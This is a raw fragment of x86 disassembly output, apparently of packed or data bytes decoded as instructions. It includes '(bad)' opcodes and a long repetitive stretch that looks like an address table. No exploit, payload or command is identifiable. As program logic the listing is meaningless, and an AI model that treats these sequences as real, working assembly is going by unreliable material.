  4170bd:	call   FWORD PTR [ecx]
  4170bf:	jns    0x4170b1
  4170c1:	lock pop esi
  4170c3:	jbe    0x417140
  4170c5:	mov    dh,0xd5
  4170c7:	shr    DWORD PTR [eax],0xc5
  4170ca:	das    
  4170cb:	adc    al,0xe9
  4170cd:	dec    esp
  4170ce:	sbb    DWORD PTR [edi-0x73],0x27ad13d0
  4170d5:	aam    0x8
  4170d7:	mov    dl,0x41
  4170d9:	test   BYTE PTR [esi-0x50],0xa4
  4170dd:	adc    BYTE PTR [edx],bl
  4170df:	(bad)  
  4170e1:	dec    eax
  4170e2:	pop    es
  4170e3:	mov    edx,0xa25b2fe4
  4170e8:	mov    ah,0x88
  4170ea:	fdivrp st(5),st
  4170ec:	pop    es
  4170ed:	fiadd  WORD PTR [edi+0x4a8ca095]
  4170f3:	pop    ds
  4170f4:	or     esp,edx
  4170f6:	sbb    eax,0xe8dcf8aa
  4170fb:	fs or  eax,0x4e3a77a
  417101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417102:	jo     0x41717b
  417104:	enter  0x91b6,0xc6
  417108:	imul   DWORD PTR [edi-0x5ae5dff1]
  41710e:	dec    esi
  41710f:	push   es
  417110:	and    BYTE PTR [ecx+0x4c],cl
  417113:	sbb    BYTE PTR [ecx],cl
  417115:	into   
  417116:	mov    WORD PTR [edi+ebx*2+0x9aac9f8],ss
  41711d:	xchg   BYTE PTR [ecx+0x5d2f4ccd],dh
  417123:	mov    ds:0x5ca8f1cf,al
  417128:	cwde   
  417129:	mov    ebp,0x3f105393
  41712e:	test   eax,0x8753874d
  417133:	aad    0x4f
  417135:	je     0x41717b
  417137:	jl     0x4170d8
  417139:	jbe    0x41717d
  41713b:	pop    edx
  41713c:	std    
  41713d:	bound  eax,QWORD PTR [edi+0x19d09de]
  417143:	sub    al,0x73
  417145:	xor    BYTE PTR [edi-0x39093ff7],al
  41714b:	mov    ds:0x37141bf5,eax
  417150:	mov    al,BYTE PTR [esi]
  417152:	lods   al,BYTE PTR ds:[esi]
  417153:	jno    0x417135
  417155:	or     BYTE PTR [edi-0x2669f716],cl
  41715b:	jecxz  0x41714a
  41715d:	aam    0x69
  41715f:	add    al,bh
  417161:	add    BYTE PTR [ecx],0x0
  417164:	or     al,BYTE PTR [ebx-0x7dd3ffff]
  41716a:	add    DWORD PTR [eax],eax
  41716c:	into   
  41716d:	add    DWORD PTR [ecx],0x1831c00
  417173:	add    BYTE PTR [esi],ah
  417175:	test   BYTE PTR [ecx],al
  417177:	add    BYTE PTR [esi],bl
  417179:	add    BYTE PTR [ecx],0x0
  41717c:	mov    dl,0x82
  41717e:	add    DWORD PTR [eax],eax
  417180:	in     al,0x81
  417182:	add    DWORD PTR [eax],eax
  417184:	pop    esp
  417185:	add    BYTE PTR [ecx],0x0
  417188:	push   es
  417189:	add    DWORD PTR [ecx],0x1827a00
  41718f:	add    BYTE PTR [esi-0x7d],bl
  417192:	add    DWORD PTR [eax],eax
  417194:	push   edx
  417195:	add    DWORD PTR [ecx],0x1839600
  41719b:	add    BYTE PTR [edx+0x4c000181],bh
  4171a1:	add    BYTE PTR [ecx],0x0
  4171a4:	ins    BYTE PTR es:[edi],dx
  4171a5:	add    DWORD PTR [ecx],0x0
  4171a8:	and    al,0x81
  4171aa:	add    DWORD PTR [eax],eax
  4171ac:	add    BYTE PTR fs:[ecx],0x0
  4171b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b1:	add    DWORD PTR [ecx],0x1834000
  4171b7:	add    dl,bl
  4171b9:	add    DWORD PTR [ecx],0x0
  4171bc:	outs   dx,BYTE PTR ds:[esi]
  4171bd:	add    DWORD PTR [ecx],0x1813e00
  4171c3:	add    BYTE PTR [edx+0x16000180],bh
  4171c9:	test   BYTE PTR [ecx],al
  4171cb:	add    dh,ah
  4171cd:	add    BYTE PTR [ecx],0x0
  4171d0:	jl     0x417153
  4171d2:	add    DWORD PTR [eax],eax
  4171d4:	mov    ds:0xbe000182,al
  4171d9:	add    DWORD PTR [ecx],0x0
  4171dc:	jb     0x41715e
  4171de:	add    DWORD PTR [eax],eax
  4171e0:	mov    al,BYTE PTR [eax-0x7d0fffff]
  4171e6:	add    DWORD PTR [eax],eax
  4171e8:	nop
  4171e9:	add    BYTE PTR [ecx],0x0
  4171ec:	rol    BYTE PTR [edx-0x7f63ffff],1
  4171f2:	add    DWORD PTR [eax],eax
  4171f4:	cmp    al,0x82
  4171f6:	add    DWORD PTR [eax],eax
  4171f8:	add    BYTE PTR [ecx+eax*1+0x1818c00],al
  4171ff:	add    BYTE PTR [ebx+eax*4-0x7df3ffff],ch
  417206:	add    DWORD PTR [eax],eax
  417208:	jl     0x41718d
  41720a:	add    DWORD PTR [eax],eax
  41720c:	(bad)  
  41720d:	add    BYTE PTR [ecx],0x0
  417210:	loopne 0x417194
  417212:	add    DWORD PTR [eax],eax
  417214:	add    BYTE PTR [eax],al
  417216:	add    BYTE PTR [eax],al
  417218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417219:	test   DWORD PTR [ecx],eax
  41721b:	add    BYTE PTR [edx-0x7c],bh
  41721e:	add    DWORD PTR [eax],eax
  417220:	out    dx,al
  417221:	xchg   BYTE PTR [ecx],al
  417223:	add    BYTE PTR [esi],al
  417225:	mov    DWORD PTR [ecx],eax
  417227:	add    BYTE PTR [esi+eax*4+0x1],ah
  41722b:	add    BYTE PTR [edx+0x6c000184],ch
  417231:	xchg   DWORD PTR [ecx],eax
  417233:	add    ah,dh
  417235:	xchg   DWORD PTR [ecx],eax
  417237:	add    BYTE PTR [edi+eax*4],bl
  41723a:	add    DWORD PTR [eax],eax
  41723c:	xor    al,BYTE PTR [edi-0x7b13ffff]
  417242:	add    DWORD PTR [eax],eax
  417244:	cli    
  417245:	test   DWORD PTR [ecx],eax
  417247:	add    al,bh
  417249:	mov    BYTE PTR [ecx],al
  41724b:	add    BYTE PTR [eax],dh
  41724d:	xchg   BYTE PTR [ecx],al
  41724f:	add    BYTE PTR [edx-0x25fffe7b],al
  417255:	test   DWORD PTR [ecx],eax
  417257:	add    al,dl
  417259:	xchg   DWORD PTR [ecx],eax
  41725b:	add    BYTE PTR [edi+eax*4],al
  41725e:	add    DWORD PTR [eax],eax
  417260:	mov    DWORD PTR ds:[ecx],eax
  417263:	add    BYTE PTR [esi-0x67fffe7c],dl
  417269:	test   DWORD PTR [ecx],eax
  41726b:	add    dl,dl
  41726d:	mov    DWORD PTR [ecx],eax
  41726f:	add    BYTE PTR [edx+0x76000189],dh
  417275:	mov    BYTE PTR [ecx],al
  417277:	add    BYTE PTR [eax-0x7c],dl
  41727a:	add    DWORD PTR [eax],eax
  41727c:	push   es
  41727d:	mov    al,BYTE PTR [ecx]
  41727f:	add    BYTE PTR [edx],bl
  417281:	mov    DWORD PTR [ecx],eax
  417283:	add    BYTE PTR [esi],bh
  417285:	xchg   DWORD PTR [ecx],eax
  417287:	add    BYTE PTR [eax+ecx*4],ah
  41728a:	add    DWORD PTR [eax],eax
  41728c:	push   esp
  41728d:	xchg   DWORD PTR [ecx],eax
  41728f:	add    BYTE PTR [edx-0x77],bl
  417292:	add    DWORD PTR [eax],eax
  417294:	fadd   DWORD PTR [ecx+eax*1+0x1851000]
  41729b:	add    BYTE PTR [eax],ch
  41729d:	mov    DWORD PTR [ecx],eax
  41729f:	add    dl,al
  4172a1:	mov    DWORD PTR [ecx],eax
  4172a3:	add    BYTE PTR [esi-0x7a],al
  4172a6:	add    DWORD PTR [eax],eax
  4172a8:	lock mov DWORD PTR [ecx],eax
  4172ab:	add    BYTE PTR [esi],dl
  4172ad:	mov    al,BYTE PTR [ecx]
  4172af:	add    BYTE PTR [edx],dl
  4172b1:	mov    BYTE PTR [ecx],al
  4172b3:	add    BYTE PTR [edx-0x71fffe79],ah
  4172b9:	xchg   DWORD PTR [ecx],eax
  4172bb:	add    dh,bl
  4172bd:	mov    DWORD PTR [ecx],eax
  4172bf:	add    BYTE PTR [esi+0x42000189],bl
  4172c5:	test   DWORD PTR [ecx],eax
  4172c7:	add    BYTE PTR [eax+0x68000189],cl
  4172cd:	test   DWORD PTR [ecx],eax
  4172cf:	add    BYTE PTR [esi-0x7c],ah
  4172d2:	add    DWORD PTR [eax],eax
  4172d4:	cld    
  4172d5:	test   BYTE PTR [ecx],al
  4172d7:	add    BYTE PTR [esi-0x77],dh
  4172da:	add    DWORD PTR [eax],eax
  4172dc:	mov    BYTE PTR ds:[ecx],al
  4172df:	add    BYTE PTR [edx+0x16000188],dl
  4172e5:	xchg   BYTE PTR [ecx],al
  4172e7:	add    al,ah
  4172e9:	mov    BYTE PTR [ecx],al
  4172eb:	add    BYTE PTR [edx+ecx*4],dh
  4172ee:	add    DWORD PTR [eax],eax
  4172f0:	or     al,BYTE PTR [esi-0x7985ffff]
  4172f6:	add    DWORD PTR [eax],eax
  4172f8:	pop    eax
  4172f9:	mov    BYTE PTR [ecx],al
  4172fb:	add    dh,cl
  4172fd:	xchg   BYTE PTR [ecx],al
  4172ff:	add    BYTE PTR [edx],dh
  417301:	test   DWORD PTR [ecx],eax
  417303:	add    BYTE PTR [esi-0x3dfffe78],dh
  417309:	test   BYTE PTR [ecx],al
  41730b:	add    ah,al
  41730d:	test   DWORD PTR [ecx],eax
  41730f:	add    BYTE PTR [eax+0x56000188],ah
  417315:	test   DWORD PTR [ecx],eax
  417317:	add    BYTE PTR [esi+eax*4-0x783fffff],dh
  41731e:	add    DWORD PTR [eax],eax
  417320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417321:	xchg   BYTE PTR [ecx],al
  417323:	add    BYTE PTR [eax-0x39fffe7c],cl
  417329:	mov    BYTE PTR [ecx],al
  41732b:	add    BYTE PTR [esi+eax*4-0x7a15ffff],dl
  417332:	add    DWORD PTR [eax],eax
  417334:	in     al,0x87
  417336:	add    DWORD PTR [eax],eax
  417338:	add    BYTE PTR [eax],al
  41733a:	add    BYTE PTR [eax],al
  41733c:	add    cl,BYTE PTR [ebp-0x744bffff]
  417342:	add    DWORD PTR [eax],eax
  417344:	cwde   
  417345:	mov    eax,DWORD PTR [ecx]
  417347:	add    BYTE PTR [eax],ah
  417349:	mov    WORD PTR [ecx],es
  41734b:	add    dh,dl
  41734d:	mov    eax,DWORD PTR [ecx]
  41734f:	add    BYTE PTR [edx+ecx*4-0x72c1ffff],bl
  417356:	add    DWORD PTR [eax],eax
  417358:	test   BYTE PTR [edx-0x7365ffff],0x1
  41735f:	add    BYTE PTR [edx],dl
  417361:	mov    eax,DWORD PTR [ecx]
  417363:	add    dl,dl
  417365:	mov    WORD PTR [ecx],es
  417367:	add    BYTE PTR [edx],bh
  417369:	mov    eax,DWORD PTR [ecx]
  41736b:	add    BYTE PTR [eax-0x75],dl
  41736e:	add    DWORD PTR [eax],eax
  417370:	xchg   esi,eax
  417371:	lea    eax,[ecx]
  417373:	add    BYTE PTR [edx-0x74],al
  417376:	add    DWORD PTR [eax],eax
  417378:	pop    esi
  417379:	mov    al,BYTE PTR [ecx]
  41737b:	add    BYTE PTR [edx-0x73],bl
  41737e:	add    DWORD PTR [eax],eax
  417380:	jl     0x41730e
  417382:	add    DWORD PTR [eax],eax
  417384:	fimul  DWORD PTR [edx-0x728bffff]
  41738a:	add    DWORD PTR [eax],eax
  41738c:	push   ds
  41738d:	lea    eax,[ecx]
  41738f:	add    BYTE PTR [esi-0x74],bl
  417392:	add    DWORD PTR [eax],eax
  417394:	jp     0x417321
  417396:	add    DWORD PTR [eax],eax
  417398:	mov    eax,0xba00018c
  41739d:	mov    al,BYTE PTR [ecx]
  41739f:	add    BYTE PTR [eax+0x18a],al
  4173a5:	add    BYTE PTR [eax],al
  4173a7:	add    BYTE PTR [eax+edx*4-0x6f53ffff],bl
  4173ae:	add    DWORD PTR [eax],eax
  4173b0:	loopne 0x417341
  4173b2:	add    DWORD PTR [eax],eax
  4173b4:	jle    0x417344
  4173b6:	add    DWORD PTR [eax],eax
  4173b8:	rcl    BYTE PTR [eax-0x6fa5ffff],cl
  4173be:	add    DWORD PTR [eax],eax
  4173c0:	dec    esi
  4173c1:	pop    DWORD PTR [ecx]
  4173c3:	add    BYTE PTR [esi-0x17fffe72],cl
  4173c9:	mov    es,WORD PTR [ecx]
  4173cb:	add    BYTE PTR [edx-0x3ffffe71],dh
  4173d1:	nop
  4173d2:	add    DWORD PTR [eax],eax
  4173d4:	pop    DWORD PTR fs:[ecx]
  4173d7:	add    BYTE PTR [edx+0x3000018e],bh
  4173dd:	pop    DWORD PTR [ecx]
  4173df:	add    BYTE PTR [eax-0x2ffffe70],al
  4173e5:	lea    eax,[ecx]
  4173e7:	add    BYTE PTR [edx],dl
  4173e9:	pop    DWORD PTR [ecx]
  4173eb:	add    BYTE PTR [esi+ecx*4-0x7103ffff],ch
  4173f2:	add    DWORD PTR [eax],eax
  4173f4:	test   BYTE PTR [edi-0x7219ffff],0x1
  4173fb:	add    BYTE PTR [eax-0x43fffe71],ah
  417401:	lea    eax,[ecx]
  417403:	add    BYTE PTR [edx],cl
  417405:	nop
  417406:	add    DWORD PTR [eax],eax
  417408:	mov    WORD PTR [edi-0x7197ffff],cs
  41740e:	add    DWORD PTR [eax],eax
  417410:	dec    BYTE PTR [ebp-0x6fcfffff]
  417416:	add    DWORD PTR [eax],eax
  417418:	pop    eax
  417419:	mov    es,WORD PTR [ecx]
  41741b:	add    BYTE PTR [edx-0x71],bh
  41741e:	add    DWORD PTR [eax],eax
  417420:	(bad)  
  417421:	pop    DWORD PTR [ecx]
  417423:	add    BYTE PTR [esi-0x72],al
  417426:	add    DWORD PTR [eax],eax
  417428:	push   ss
  417429:	mov    es,WORD PTR [ecx]
  41742b:	add    al,dl
  41742d:	mov    es,WORD PTR [ecx]
  41742f:	add    BYTE PTR [edx+0x1e00018e],ah
  417435:	pop    DWORD PTR [ecx]
  417437:	add    BYTE PTR [eax],bl
  417439:	nop
  41743a:	add    DWORD PTR [eax],eax
  41743c:	inc    esp
  41743d:	nop
  41743e:	add    DWORD PTR [eax],eax
  417440:	sub    cl,BYTE PTR [esi+0x1]
  417446:	add    BYTE PTR [eax],al
  417448:	dec    esi
  417449:	xchg   ebx,eax
  41744a:	add    DWORD PTR [eax],eax
  41744c:	push   eax
  41744d:	xchg   ecx,eax
  41744e:	add    DWORD PTR [eax],eax
  417450:	cmp    al,0x93
  417452:	add    DWORD PTR [eax],eax
  417454:	push   esp
  417455:	xchg   edx,eax
  417456:	add    DWORD PTR [eax],eax
  417458:	ficom  WORD PTR [ecx-0x6d45ffff]
  41745e:	add    DWORD PTR [eax],eax
  417460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417461:	xchg   ecx,eax
  417462:	add    DWORD PTR [eax],eax
  417464:	bound  edx,QWORD PTR [ecx-0x6e37ffff]
  41746a:	add    DWORD PTR [eax],eax
  41746c:	adc    BYTE PTR [ebx-0x6d01ffff],dl
  417472:	add    DWORD PTR [eax],eax
  417474:	or     al,0x91
  417476:	add    DWORD PTR [eax],eax
  417478:	nop
  417479:	xchg   edx,eax
  41747a:	add    DWORD PTR [eax],eax
  41747c:	mov    ds:0xea000192,al
  417481:	xchg   ebx,eax
  417482:	add    DWORD PTR [eax],eax
  417484:	call   0x2641761b
  417489:	xchg   edx,eax
  41748a:	add    DWORD PTR [eax],eax
  41748c:	repnz xchg ecx,eax
  41748e:	add    DWORD PTR [eax],eax
  417490:	adc    dl,BYTE PTR [edx-0x6c4dffff]
  417496:	add    DWORD PTR [eax],eax
  417498:	mov    eax,0x64000191
  41749d:	xchg   ebx,eax
  41749e:	add    DWORD PTR [eax],eax
  4174a0:	jl     0x417433
  4174a2:	add    DWORD PTR [eax],eax
  4174a4:	rcl    BYTE PTR [ebx-0x6c3fffff],cl
  4174aa:	add    DWORD PTR [eax],eax
  4174ac:	outs   dx,BYTE PTR ds:[esi]
  4174ad:	xchg   edx,eax
  4174ae:	add    DWORD PTR [eax],eax
  4174b0:	jl     0x417445
  4174b2:	add    DWORD PTR [eax],eax
  4174b4:	nop
  4174b5:	xchg   ecx,eax
  4174b6:	add    DWORD PTR [eax],eax
  4174b8:	inc    eax
  4174b9:	xchg   ecx,eax
  4174ba:	add    DWORD PTR [eax],eax
  4174bc:	int3   
  4174bd:	xchg   edx,eax
  4174be:	add    DWORD PTR [eax],eax
  4174c0:	cmp    al,0x92
  4174c2:	add    DWORD PTR [eax],eax
  4174c4:	repnz nop
  4174c6:	add    DWORD PTR [eax],eax
  4174c8:	xchg   esi,eax
  4174c9:	xchg   ebx,eax
  4174ca:	add    DWORD PTR [eax],eax
  4174cc:	and    al,0x91
  4174ce:	add    DWORD PTR [eax],eax
  4174d0:	es xchg ebx,eax
  4174d2:	add    DWORD PTR [eax],eax
  4174d4:	add    BYTE PTR [eax],al
  4174d6:	add    BYTE PTR [eax],al
  4174d8:	or     BYTE PTR [edi-0x6bd5ffff],dl
  4174de:	add    DWORD PTR [eax],eax
  4174e0:	adc    BYTE PTR [ecx+eax*1+0x1953c00],0x0
  4174e8:	jbe    0x41747f
  4174ea:	add    DWORD PTR [eax],eax
  4174ec:	in     al,dx
  4174ed:	xchg   esi,eax
  4174ee:	add    DWORD PTR [eax],eax
  4174f0:	adc    BYTE PTR [ecx+eax*1+0x1958c00],dl
  4174f7:	add    BYTE PTR [esi],dh
  4174f9:	xchg   esi,eax
  4174fa:	add    DWORD PTR [eax],eax
  4174fc:	push   0xffffff94
  4174fe:	add    DWORD PTR [eax],eax
  417500:	rcl    BYTE PTR [ecx+eax*1+0x196bc00],1
  417507:	add    dl,ch
  417509:	xchg   ebp,eax
  41750a:	add    DWORD PTR [eax],eax
  41750c:	mov    dl,0x94
  41750e:	add    DWORD PTR [eax],eax
  417510:	xchg   BYTE PTR [esi-0x6a2dffff],dl
  417516:	add    DWORD PTR [eax],eax
  417518:	sbb    BYTE PTR [esi-0x695fffff],dl
  41751e:	add    DWORD PTR [eax],eax
  417520:	pop    esi
  417521:	xchg   ebp,eax
  417522:	add    DWORD PTR [eax],eax
  417524:	sub    BYTE PTR [edi-0x698dffff],dl
  41752a:	add    DWORD PTR [eax],eax
  41752c:	push   es
  41752d:	xchg   ebp,eax
  41752e:	add    DWORD PTR [eax],eax
  417530:	push   esi
  417531:	xchg   esi,eax
  417532:	add    DWORD PTR [eax],eax
  417534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417535:	xchg   ebp,eax
  417536:	add    DWORD PTR [eax],eax
  417538:	xchg   esi,eax
  417539:	xchg   esp,eax
  41753a:	add    DWORD PTR [eax],eax
  41753c:	inc    esi
  41753d:	xchg   esp,eax
  41753e:	add    DWORD PTR [eax],eax
  417540:	jmp    0x196:0x2000194
  417547:	add    BYTE PTR [esi-0x2bfffe6b],dh
  41754d:	xchg   esi,eax
  41754e:	add    DWORD PTR [eax],eax
  417550:	and    dl,BYTE PTR [ebp+0x1]
	...
